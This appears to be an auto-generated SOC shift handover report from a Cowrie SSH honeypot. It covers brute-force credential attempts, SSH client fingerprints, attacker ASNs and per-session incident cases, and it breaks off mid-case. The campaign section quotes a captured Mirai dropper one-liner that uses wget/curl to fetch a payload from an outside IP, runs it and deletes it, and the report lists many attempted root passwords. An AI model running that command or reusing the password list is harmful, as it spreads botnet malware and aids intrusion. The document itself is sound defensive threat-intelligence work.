# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-20 |
| **Generated At** | 2026-08-20T10:34:23Z |
| **Shift Time** | 10:34 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **237** |
| Confirmed Threats | **225** |
| False Positives Filtered | **12** (5.1%) |
| Unique Attacker IPs | **72** |
| Countries of Origin | **26** |
| High Severity Cases | **64** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **173** |
| Malware Samples Analyzed | **2** HIGH · **22** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **231** |
| Unique Credential Pairs | **192** |
| Unique Usernames | **15** |
| Unique Passwords | **191** |
| Successful Auth Pairs | **226** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 172 |
| `support` | 8 |
| `ubuntu` | 8 |
| `user` | 6 |
| `blank` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `user2016` | 6 |
| `blank2015` | 5 |
| `support` | 4 |
| `test2018` | 4 |
| `centos2021` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `user` | `user2016` | 6 |
| `blank` | `blank2015` | 5 |
| `support` | `support` | 4 |
| `test` | `test2018` | 4 |
| `centos` | `centos2021` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `admin2004` | `117.211.15.106` | 2026-08-20T06:55:31 |
| `admin` | `admin2004` | `49.124.152.248` | 2026-08-20T06:55:42 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.62.37.103` | 2026-08-20T06:56:45 |
| `*1` | `$4` | `34.62.37.103` | 2026-08-20T06:56:59 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 5643` | `34.62.37.103` | 2026-08-20T06:57:01 |
| `support` | `support` | `10.0.0.73` | 2026-08-20T06:58:18 |
| `test` | `test2018` | `62.220.104.155` | 2026-08-20T07:00:40 |
| `test` | `test2018` | `58.57.154.146` | 2026-08-20T07:00:50 |
| `centos` | `centos2021` | `10.0.0.73` | 2026-08-20T07:04:09 |
| `nobody` | `nobody123456789` | `36.154.134.146` | 2026-08-20T07:04:30 |
| `nobody` | `nobody123456789` | `195.218.159.123` | 2026-08-20T07:04:43 |
| `centos` | `centos2021` | `112.6.11.184` | 2026-08-20T07:05:45 |
| `centos` | `centos2021` | `122.186.18.3` | 2026-08-20T07:05:55 |
| `centos` | `centos2021` | `121.178.185.141` | 2026-08-20T07:21:40 |
| `root` | `hg2x0` | `46.224.101.121` | 2026-08-20T07:21:55 |
| `test` | `test2018` | `65.20.217.64` | 2026-08-20T07:28:56 |
| `test` | `test2018` | `111.70.10.15` | 2026-08-20T07:29:10 |
| `support` | `support2018` | `175.43.162.214` | 2026-08-20T07:34:09 |
| `support` | `support2018` | `61.145.163.164` | 2026-08-20T07:34:20 |
| `root` | `0` | `217.60.255.130` | 2026-08-20T07:36:15 |
| `config` | `config2025` | `119.152.54.111` | 2026-08-20T07:37:42 |
| `config` | `config2025` | `196.190.180.18` | 2026-08-20T07:37:49 |
| `config` | `config2025` | `103.147.248.44` | 2026-08-20T07:37:56 |
| `config` | `config2025` | `123.129.245.249` | 2026-08-20T07:38:05 |
| `support` | `support` | `176.53.159.196` | 2026-08-20T07:38:11 |
| `ubuntu` | `ubuntu@1234` | `217.60.255.130` | 2026-08-20T07:38:16 |
| `root` | `root2014` | `80.233.12.109` | 2026-08-20T07:39:04 |
| `support` | `support2018` | `10.0.0.73` | 2026-08-20T07:45:20 |
| `root` | `1` | `217.60.255.130` | 2026-08-20T07:47:20 |
| `admin` | `admin` | `34.77.186.60` | 2026-08-20T07:48:13 |
| `ubuntu` | `debian@1234` | `217.60.255.130` | 2026-08-20T07:49:22 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `35.205.21.112` | 2026-08-20T07:49:28 |
| `*1` | `$4` | `35.205.21.112` | 2026-08-20T07:49:41 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 5357` | `35.205.21.112` | 2026-08-20T07:49:43 |
| `user` | `user2016` | `10.0.0.73` | 2026-08-20T07:52:52 |
| `root` | `root2014` | `124.160.45.26` | 2026-08-20T07:55:19 |
| `root` | `root2014` | `187.126.105.42` | 2026-08-20T07:55:31 |
| `root` | `admin` | `45.198.224.26` | 2026-08-20T07:57:44 |
| `root` | `7` | `217.60.255.130` | 2026-08-20T07:58:00 |
| `ubuntu` | `wsadmin` | `217.60.255.130` | 2026-08-20T08:00:11 |
| `root` | `root2016` | `85.30.248.213` | 2026-08-20T08:07:18 |
| `root` | `root2016` | `62.91.108.146` | 2026-08-20T08:07:25 |
| `root` | `11` | `217.60.255.130` | 2026-08-20T08:08:32 |
| `ubuntu` | `1234@` | `217.60.255.130` | 2026-08-20T08:10:53 |
| `supervisor` | `supervisor2011` | `10.0.0.73` | 2026-08-20T08:10:58 |
| `user` | `user2016` | `81.195.152.14` | 2026-08-20T08:11:00 |
| `user` | `user2016` | `70.91.135.181` | 2026-08-20T08:11:08 |
| `user` | `user2016` | `111.198.53.188` | 2026-08-20T08:11:13 |
| `user` | `user2016` | `203.123.219.137` | 2026-08-20T08:11:23 |
| `supervisor` | `supervisor2011` | `181.129.31.42` | 2026-08-20T08:12:35 |
| `supervisor` | `supervisor2011` | `203.252.10.4` | 2026-08-20T08:12:44 |
| `root` | `root2016` | `10.0.0.73` | 2026-08-20T08:18:46 |
| `root` | `12` | `217.60.255.130` | 2026-08-20T08:19:17 |
| `ubuntu` | `1qaz@WSX3edc$RFV` | `217.60.255.130` | 2026-08-20T08:21:49 |
| `blank` | `blank2015` | `10.0.0.73` | 2026-08-20T08:26:22 |
| `root` | `22` | `217.60.255.130` | 2026-08-20T08:29:55 |
| `ubuntu` | `Asiatech@1234` | `217.60.255.130` | 2026-08-20T08:32:47 |
| `root` | `root2016` | `177.174.0.3` | 2026-08-20T08:35:38 |
| `root` | `110` | `217.60.255.130` | 2026-08-20T08:40:35 |
| `root` | `!QAZ2wsx` | `10.0.0.73` | 2026-08-20T08:40:35 |
| `root` | `963214785` | `10.0.0.73` | 2026-08-20T08:40:38 |
| `root` | `19860309` | `10.0.0.73` | 2026-08-20T08:40:41 |
| `root` | `12152205` | `10.0.0.73` | 2026-08-20T08:40:44 |
| `root` | `19830128` | `10.0.0.73` | 2026-08-20T08:40:46 |
| `unknown` | `unknown2003` | `80.233.77.136` | 2026-08-20T08:40:47 |
| `root` | `123456jj` | `10.0.0.73` | 2026-08-20T08:40:50 |
| `root` | `abc123321` | `10.0.0.73` | 2026-08-20T08:40:52 |
| `root` | `mrf11277215` | `10.0.0.73` | 2026-08-20T08:40:55 |
| `unknown` | `unknown2003` | `222.99.52.202` | 2026-08-20T08:40:56 |
| `root` | `19830204` | `10.0.0.73` | 2026-08-20T08:40:59 |
| `root` | `a520520aa` | `10.0.0.73` | 2026-08-20T08:41:02 |
| `root` | `19850706` | `10.0.0.73` | 2026-08-20T08:41:07 |
| `root` | `19830912` | `10.0.0.73` | 2026-08-20T08:41:10 |
| `root` | `19820504` | `10.0.0.73` | 2026-08-20T08:41:17 |
| `root` | `123456888` | `10.0.0.73` | 2026-08-20T08:41:20 |
| `root` | `19820526` | `10.0.0.73` | 2026-08-20T08:41:23 |
| `root` | `lingfeng` | `10.0.0.73` | 2026-08-20T08:41:27 |
| `root` | `19801118` | `10.0.0.73` | 2026-08-20T08:41:30 |
| `root` | `19901230` | `10.0.0.73` | 2026-08-20T08:41:33 |
| `root` | `19870506` | `10.0.0.73` | 2026-08-20T08:41:37 |
| `root` | `19830326` | `10.0.0.73` | 2026-08-20T08:41:41 |
| `root` | `123789123` | `10.0.0.73` | 2026-08-20T08:41:44 |
| `root` | `19801206` | `10.0.0.73` | 2026-08-20T08:41:48 |
| `root` | `654321abc` | `10.0.0.73` | 2026-08-20T08:41:51 |
| `root` | `19840710` | `10.0.0.73` | 2026-08-20T08:41:54 |
| `root` | `12345678W` | `10.0.0.73` | 2026-08-20T08:41:58 |
| `root` | `z1111111` | `10.0.0.73` | 2026-08-20T08:42:01 |
| `root` | `nevergiveup` | `10.0.0.73` | 2026-08-20T08:42:04 |
| `root` | `19901014` | `10.0.0.73` | 2026-08-20T08:42:06 |
| `root` | `19830710` | `10.0.0.73` | 2026-08-20T08:42:09 |
| `root` | `19900126` | `10.0.0.73` | 2026-08-20T08:42:13 |
| `root` | `19901212` | `10.0.0.73` | 2026-08-20T08:42:18 |
| `root` | `19860427` | `10.0.0.73` | 2026-08-20T08:42:21 |
| `root` | `19830707` | `10.0.0.73` | 2026-08-20T08:42:25 |
| `root` | `huahuahua` | `10.0.0.73` | 2026-08-20T08:42:29 |
| `root` | `19850811` | `10.0.0.73` | 2026-08-20T08:42:32 |
| `root` | `comeonbaby` | `10.0.0.73` | 2026-08-20T08:42:36 |
| `root` | `19801217` | `10.0.0.73` | 2026-08-20T08:42:39 |
| `root` | `19830228` | `10.0.0.73` | 2026-08-20T08:42:42 |
| `root` | `19830320` | `10.0.0.73` | 2026-08-20T08:42:46 |
| `root` | `98188729` | `10.0.0.73` | 2026-08-20T08:42:49 |
| `root` | `7758521.` | `10.0.0.73` | 2026-08-20T08:42:52 |
| `root` | `19850511` | `10.0.0.73` | 2026-08-20T08:42:55 |
| `root` | `19810923` | `10.0.0.73` | 2026-08-20T08:42:58 |
| `root` | `19840316` | `10.0.0.73` | 2026-08-20T08:43:02 |
| `root` | `19890429` | `10.0.0.73` | 2026-08-20T08:43:04 |
| `root` | `xiaoqian` | `10.0.0.73` | 2026-08-20T08:43:07 |
| `root` | `19850728` | `10.0.0.73` | 2026-08-20T08:43:10 |
| `root` | `19820222` | `10.0.0.73` | 2026-08-20T08:43:13 |
| `root` | `admintus` | `10.0.0.73` | 2026-08-20T08:43:16 |
| `root` | `zzzzxxxx` | `10.0.0.73` | 2026-08-20T08:43:19 |
| `root` | `19811205` | `10.0.0.73` | 2026-08-20T08:43:22 |
| `root` | `123456xyz` | `10.0.0.73` | 2026-08-20T08:43:26 |
| `root` | `19811202` | `10.0.0.73` | 2026-08-20T08:43:28 |
| `ubuntu` | `Armaghan@123` | `217.60.255.130` | 2026-08-20T08:43:29 |
| `root` | `19880409` | `10.0.0.73` | 2026-08-20T08:43:34 |
| `root` | `19850620` | `10.0.0.73` | 2026-08-20T08:43:38 |
| `root` | `19811208` | `10.0.0.73` | 2026-08-20T08:43:40 |
| `root` | `19890414` | `10.0.0.73` | 2026-08-20T08:43:44 |
| `root` | `19850422` | `10.0.0.73` | 2026-08-20T08:43:47 |
| `root` | `a123456.` | `10.0.0.73` | 2026-08-20T08:43:51 |
| `root` | `WOSHINIMA` | `10.0.0.73` | 2026-08-20T08:43:54 |
| `root` | `tqtwffgcc` | `10.0.0.73` | 2026-08-20T08:43:57 |
| `root` | `19820405` | `10.0.0.73` | 2026-08-20T08:44:00 |
| `root` | `19860322` | `10.0.0.73` | 2026-08-20T08:44:04 |
| `root` | `123qwe456` | `10.0.0.73` | 2026-08-20T08:44:07 |
| `root` | `19820518` | `10.0.0.73` | 2026-08-20T08:44:11 |
| `root` | `chencheng` | `10.0.0.73` | 2026-08-20T08:44:14 |
| `root` | `zhangcheng` | `10.0.0.73` | 2026-08-20T08:44:16 |
| `root` | `y1234567` | `10.0.0.73` | 2026-08-20T08:44:20 |
| `root` | `35353535` | `10.0.0.73` | 2026-08-20T08:44:23 |
| `root` | `826826826` | `10.0.0.73` | 2026-08-20T08:44:25 |
| `blank` | `blank2015` | `213.55.79.195` | 2026-08-20T08:44:28 |
| `root` | `19880630` | `10.0.0.73` | 2026-08-20T08:44:28 |
| `root` | `19900520` | `10.0.0.73` | 2026-08-20T08:44:32 |
| `root` | `19840806` | `10.0.0.73` | 2026-08-20T08:44:35 |
| `blank` | `blank2015` | `116.113.241.82` | 2026-08-20T08:44:37 |
| `root` | `19820516` | `10.0.0.73` | 2026-08-20T08:44:38 |
| `root` | `12345678@` | `10.0.0.73` | 2026-08-20T08:44:41 |
| `blank` | `blank2015` | `116.72.9.151` | 2026-08-20T08:44:43 |
| `root` | `19801128` | `10.0.0.73` | 2026-08-20T08:44:46 |
| `root` | `19820206` | `10.0.0.73` | 2026-08-20T08:44:49 |
| `blank` | `blank2015` | `179.185.18.67` | 2026-08-20T08:44:53 |
| `root` | `19880413` | `10.0.0.73` | 2026-08-20T08:44:53 |
| `root` | `b123456789` | `10.0.0.73` | 2026-08-20T08:44:57 |
| `root` | `19890223` | `10.0.0.73` | 2026-08-20T08:45:00 |
| `root` | `19801211` | `10.0.0.73` | 2026-08-20T08:45:04 |
| `root` | `19830522` | `10.0.0.73` | 2026-08-20T08:45:07 |
| `root` | `19850519` | `10.0.0.73` | 2026-08-20T08:45:10 |
| `root` | `19820725` | `10.0.0.73` | 2026-08-20T08:45:14 |
| `root` | `19840322` | `10.0.0.73` | 2026-08-20T08:45:16 |
| `root` | `a123a123` | `10.0.0.73` | 2026-08-20T08:45:20 |
| `root` | `86680101` | `10.0.0.73` | 2026-08-20T08:45:24 |
| `root` | `yangpeng` | `10.0.0.73` | 2026-08-20T08:45:27 |
| `root` | `19820105` | `10.0.0.73` | 2026-08-20T08:45:30 |
| `root` | `19890708` | `10.0.0.73` | 2026-08-20T08:45:33 |
| `root` | `12251225` | `10.0.0.73` | 2026-08-20T08:45:36 |
| `root` | `19811211` | `10.0.0.73` | 2026-08-20T08:45:39 |
| `root` | `19900214` | `10.0.0.73` | 2026-08-20T08:45:42 |
| `root` | ``1234567` | `10.0.0.73` | 2026-08-20T08:45:46 |
| `root` | `19820611` | `10.0.0.73` | 2026-08-20T08:45:49 |
| `root` | `19830404` | `10.0.0.73` | 2026-08-20T08:45:51 |
| `root` | `wangsheng` | `10.0.0.73` | 2026-08-20T08:45:55 |
| `root` | `19850406` | `10.0.0.73` | 2026-08-20T08:45:58 |
| `root` | `19820424` | `10.0.0.73` | 2026-08-20T08:46:01 |
| `root` | `19860530` | `10.0.0.73` | 2026-08-20T08:46:04 |
| `root` | `19840529` | `10.0.0.73` | 2026-08-20T08:46:07 |
| `nobody` | `nobody2010` | `60.173.105.206` | 2026-08-20T08:46:10 |
| `root` | `19890403` | `10.0.0.73` | 2026-08-20T08:46:11 |
| `root` | `19820710` | `10.0.0.73` | 2026-08-20T08:46:13 |
| `root` | `19840714` | `10.0.0.73` | 2026-08-20T08:46:16 |
| `root` | `19860803` | `10.0.0.73` | 2026-08-20T08:46:19 |
| `nobody` | `nobody2010` | `220.178.246.43` | 2026-08-20T08:46:21 |
| `root` | `123321456654` | `10.0.0.73` | 2026-08-20T08:46:21 |
| `root` | `19890917` | `10.0.0.73` | 2026-08-20T08:46:25 |
| `root` | `000000123` | `10.0.0.73` | 2026-08-20T08:46:30 |
| `root` | `ddddddddd` | `10.0.0.73` | 2026-08-20T08:46:34 |
| `root` | `123456789000` | `10.0.0.73` | 2026-08-20T08:46:36 |
| `root` | `16881688` | `10.0.0.73` | 2026-08-20T08:46:40 |
| `root` | `19830217` | `10.0.0.73` | 2026-08-20T08:46:43 |
| `root` | `a88888888` | `10.0.0.73` | 2026-08-20T08:46:46 |
| `root` | `19840623` | `10.0.0.73` | 2026-08-20T08:46:49 |
| `root` | `19890519` | `10.0.0.73` | 2026-08-20T08:46:52 |
| `root` | `19830903` | `10.0.0.73` | 2026-08-20T08:46:55 |
| `root` | `xiaoqing` | `10.0.0.73` | 2026-08-20T08:46:59 |
| `root` | `19830223` | `10.0.0.73` | 2026-08-20T08:47:03 |
| `root` | `831101qsl` | `10.0.0.73` | 2026-08-20T08:47:06 |
| `root` | `19850802` | `10.0.0.73` | 2026-08-20T08:47:12 |
| `root` | `19850521` | `10.0.0.73` | 2026-08-20T08:47:15 |
| `root` | `19860727` | `10.0.0.73` | 2026-08-20T08:47:18 |
| `root` | `19840611` | `10.0.0.73` | 2026-08-20T08:47:21 |
| `root` | `19820728` | `10.0.0.73` | 2026-08-20T08:47:25 |
| `root` | `qwe123asd` | `10.0.0.73` | 2026-08-20T08:47:28 |
| `root` | `19810824` | `10.0.0.73` | 2026-08-20T08:47:31 |
| `root` | `19791127` | `10.0.0.73` | 2026-08-20T08:47:34 |
| `root` | `19840517` | `10.0.0.73` | 2026-08-20T08:47:38 |
| `root` | `52771314` | `10.0.0.73` | 2026-08-20T08:47:42 |
| `root` | `19830117` | `10.0.0.73` | 2026-08-20T08:47:45 |
| `root` | `19840722` | `10.0.0.73` | 2026-08-20T08:47:48 |
| `root` | `19840903` | `10.0.0.73` | 2026-08-20T08:47:50 |
| `root` | `19820209` | `10.0.0.73` | 2026-08-20T08:47:53 |
| `root` | `www.163.com` | `10.0.0.73` | 2026-08-20T08:47:57 |
| `root` | `19820215` | `10.0.0.73` | 2026-08-20T08:48:00 |
| `root` | `19850627` | `10.0.0.73` | 2026-08-20T08:48:04 |
| `root` | `19840905` | `10.0.0.73` | 2026-08-20T08:48:06 |
| `root` | `12332145` | `10.0.0.73` | 2026-08-20T08:48:09 |
| `root` | `19830325` | `10.0.0.73` | 2026-08-20T08:48:13 |
| `root` | `1qaz!QAZ` | `10.0.0.73` | 2026-08-20T08:48:16 |
| `root` | `19860330` | `10.0.0.73` | 2026-08-20T08:48:21 |
| `root` | `19890609` | `10.0.0.73` | 2026-08-20T08:48:25 |
| `root` | `wushuang` | `10.0.0.73` | 2026-08-20T08:48:27 |
| `root` | `19850717` | `10.0.0.73` | 2026-08-20T08:48:30 |
| `root` | `19901026` | `10.0.0.73` | 2026-08-20T08:48:33 |
| `root` | `1231231230` | `10.0.0.73` | 2026-08-20T08:48:36 |
| `root` | `19840206` | `10.0.0.73` | 2026-08-20T08:48:40 |
| `root` | `2718281828` | `10.0.0.73` | 2026-08-20T08:48:42 |
| `root` | `19830602` | `10.0.0.73` | 2026-08-20T08:48:45 |
| `root` | `11201120` | `10.0.0.73` | 2026-08-20T08:48:48 |
| `root` | `zhang1988` | `10.0.0.73` | 2026-08-20T08:48:51 |
| `root` | `19801129` | `10.0.0.73` | 2026-08-20T08:48:54 |
| `root` | `19850719` | `10.0.0.73` | 2026-08-20T08:48:57 |
| `root` | `tblkspthkr` | `10.0.0.73` | 2026-08-20T08:48:59 |
| `root` | `19840306` | `10.0.0.73` | 2026-08-20T08:49:04 |
| `root` | `123` | `217.60.255.130` | 2026-08-20T08:51:17 |
| `unknown` | `unknown2003` | `10.0.0.73` | 2026-08-20T08:52:13 |
| `ubuntu` | `Cloud1403` | `217.60.255.130` | 2026-08-20T08:54:29 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **237** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 38 |
| libssh | 24 |
| Nmap scanner | 7 |
| Go SSH scanner | 7 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 38 | 38 |
| `419da4c91ddb...` | Modern SSH client | 16 | 1 |
| `e788c657d1a2...` | Mirai/variant | 6 | 1 |
| `4e066189c3bb...` | Generic scanner | 4 | 2 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 38 | 38 | Mirai/variant |
| `419da4c91ddb...` | libssh | 16 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 8 | 3 | — |
| `e788c657d1a2...` | Nmap scanner | 6 | 1 | Mirai/variant |
| `4e066189c3bb...` | Go SSH scanner | 4 | 2 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `5bd26477da54...` | PuTTY | 1 | 1 | Mirai/variant |
| `dde267e50f82...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1070, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1059.004` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
```
```
cd /tmp
```
```
wget http://5.182.210.174/ok
```
```
curl -O http://5.182.210.174/ok
```
```
chmod +x ok
```
Source IPs: `45.198.224.26`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
system
```
```
shell
```
```
sh
```
```
/bin/busybox SATORI
```
Source IPs: `46.224.101.121`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **72** |
| Unique ASNs | **50** |
| High-Risk ASNs | **42** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS396982` | Google LLC | 5 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 5 | HIGH |
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS13280` | Three Ireland (Hutchison) limited | 2 | HIGH |
| `AS9829` | National Internet Backbone | 2 | HIGH |
| `AS24757` | Ethio Telecom | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (64)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-608a421846c4

| Field | Detail |
|---|---|
| **Source IP** | `117.211.15[.]106` |
| **First Seen** | 2026-08-20 06:55 |
| **Last Seen** | 2026-08-20 06:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 06:55:28` | `cowrie.session.connect` |
| `2026-08-20 06:55:29` | `cowrie.client.version` |
| `2026-08-20 06:55:29` | `cowrie.client.kex` |
| `2026-08-20 06:55:31` | `cowrie.login.success` |
| `2026-08-20 06:55:32` | `cowrie.direct-tcpip.request` |
| `2026-08-20 06:55:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.211.15[.]106` to AbuseIPDB if not already reported
- [ ] Block `117.211.15[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbf0bd724600

| Field | Detail |
|---|---|
| **Source IP** | `49.124.152[.]248` |
| **First Seen** | 2026-08-20 06:55 |
| **Last Seen** | 2026-08-20 06:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 06:55:39` | `cowrie.session.connect` |
| `2026-08-20 06:55:39` | `cowrie.client.version` |
| `2026-08-20 06:55:39` | `cowrie.client.kex` |
| `2026-08-20 06:55:42` | `cowrie.login.success` |
| `2026-08-20 06:55:42` | `cowrie.direct-tcpip.request` |
| `2026-08-20 06:55:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.152[.]248` to AbuseIPDB if not already reported
- [ ] Block `49.124.152[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-516c94d8fc21

| Field | Detail |
|---|---|
| **Source IP** | `34.62.37[.]103` |
| **First Seen** | 2026-08-20 06:56 |
| **Last Seen** | 2026-08-20 06:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 06:56:45` | `cowrie.session.connect` |
| `2026-08-20 06:56:45` | `cowrie.login.success` |
| `2026-08-20 06:56:46` | `cowrie.session.params` |
| `2026-08-20 06:56:46` | `cowrie.command.input` |
| `2026-08-20 06:56:46` | `cowrie.command.input` |
| `2026-08-20 06:56:46` | `cowrie.command.failed` |
| `2026-08-20 06:56:46` | `cowrie.command.input` |
| `2026-08-20 06:56:46` | `cowrie.log.closed` |
| `2026-08-20 06:56:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.62.37[.]103` to AbuseIPDB if not already reported
- [ ] Block `34.62.37[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61f6ebf691b8

| Field | Detail |
|---|---|
| **Source IP** | `34.62.37[.]103` |
| **First Seen** | 2026-08-20 06:56 |
| **Last Seen** | 2026-08-20 06:57 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 06:56:59` | `cowrie.session.connect` |
| `2026-08-20 06:56:59` | `cowrie.login.success` |
| `2026-08-20 06:56:59` | `cowrie.session.params` |
| `2026-08-20 06:56:59` | `cowrie.command.input` |
| `2026-08-20 06:56:59` | `cowrie.command.failed` |
| `2026-08-20 06:57:10` | `cowrie.log.closed` |
| `2026-08-20 06:57:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.62.37[.]103` to AbuseIPDB if not already reported
- [ ] Block `34.62.37[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbbe72c10c89

| Field | Detail |
|---|---|
| **Source IP** | `34.62.37[.]103` |
| **First Seen** | 2026-08-20 06:57 |
| **Last Seen** | 2026-08-20 06:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 06:57:01` | `cowrie.session.connect` |
| `2026-08-20 06:57:01` | `cowrie.login.success` |
| `2026-08-20 06:57:01` | `cowrie.session.params` |
| `2026-08-20 06:57:01` | `cowrie.command.input` |
| `2026-08-20 06:57:10` | `cowrie.log.closed` |
| `2026-08-20 06:57:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.62.37[.]103` to AbuseIPDB if not already reported
- [ ] Block `34.62.37[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c3fcc9d4108

| Field | Detail |
|---|---|
| **Source IP** | `62.220.104[.]155` |
| **First Seen** | 2026-08-20 07:00 |
| **Last Seen** | 2026-08-20 07:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:00:38` | `cowrie.session.connect` |
| `2026-08-20 07:00:39` | `cowrie.client.version` |
| `2026-08-20 07:00:39` | `cowrie.client.kex` |
| `2026-08-20 07:00:40` | `cowrie.login.success` |
| `2026-08-20 07:00:41` | `cowrie.direct-tcpip.request` |
| `2026-08-20 07:00:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.220.104[.]155` to AbuseIPDB if not already reported
- [ ] Block `62.220.104[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7dc7566c5ee

| Field | Detail |
|---|---|
| **Source IP** | `58.57.154[.]146` |
| **First Seen** | 2026-08-20 07:00 |
| **Last Seen** | 2026-08-20 07:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
